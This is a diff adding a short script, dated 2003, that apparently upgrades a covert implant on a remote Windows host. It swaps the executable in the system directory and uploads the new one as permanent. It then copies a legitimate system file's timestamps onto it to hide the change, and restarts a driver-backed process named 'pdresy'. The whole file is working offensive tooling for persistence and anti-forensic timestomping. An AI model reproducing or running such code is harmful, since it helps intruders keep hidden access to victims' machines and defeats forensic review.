@@ -1,0 +1,93 @@
+#-------------------------------------------------------------------------------
+# File: Level4UpgradeExe.eps
+# Description: Performs a level4 upgrade for the exe version
+#
+# Modifications:
+#	08/07/03	Created
+#-------------------------------------------------------------------------------
+
+@echo off;
+@include "_GetSystemPaths.epm";
+
+string $driver = "pdresy";
+
+if ($argc != 5) {
+    echo "Usage: $argv[0] <localFile> <remoteName> <tempOldName> <matchFile>";
+    return false;
+}
+
+string $localFile = $argv[1];
+string $remoteName = $argv[2];
+string $tempOldName = $argv[3];
+string $matchFile = $argv[4];
+
+string $system;
+string $root;
+ifnot (_GetSystemPaths($root, $system)) {
+    echo "* Unable to get system directory";
+    return false;
+}
+
+# move old exe
+echo "Moving old exe to temp name";
+if (`move "$root\\$system\\$remoteName" "$root\\$system\\$tempOldName"`) {
+    echo "    MOVED";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# upload new exe
+echo "Uploading new exe";
+if (`put "$localFile" -name "$root\\$system\\$remoteName" -permanent`) {
+    echo "    UPLOADED";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# match file times for new exe
+echo "Matching file time for EXE";
+if (`matchtimes "$root\\$system\\$matchFile" "$root\\$system\\$remoteName"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+@record on;
+bool $started = false;
+echo "Getting old process id";
+if (`dp_getprocessid -name $driver`) {
+    int $id = GetCmdData("id");
+    if (defined($id) && ($id != 0)) {
+	echo "    SUCCESS (id = $id)";
+	
+	# clear the old process
+	`dp_clearprocessid -name $driver`;
+	
+	# start the new process
+	echo "Starting new exe";
+	if (`dp_restartprocess -name $driver`) {
+	    echo "    SUCCESS";
+	    $started = true;
+	} else {
+	    echo "    FAILED";
+	}	    
+    } else {
+	echo "    FAILED (Unable to determine old process id)";
+    }
+} else {
+    echo "    FAILED (unable to get old process id)";
+}
+
+echo "";
+if ($started) {
+    echo "New exe is started.";
+    echo "";
+    echo "Verify new PC is running correctly";
+    echo "    and then *** terminate and delete old one by hand ***";
+    return true;
+} else {
+    echo "New exe is NOT running -- cleanup must be done by hand";
+    return false;
+}
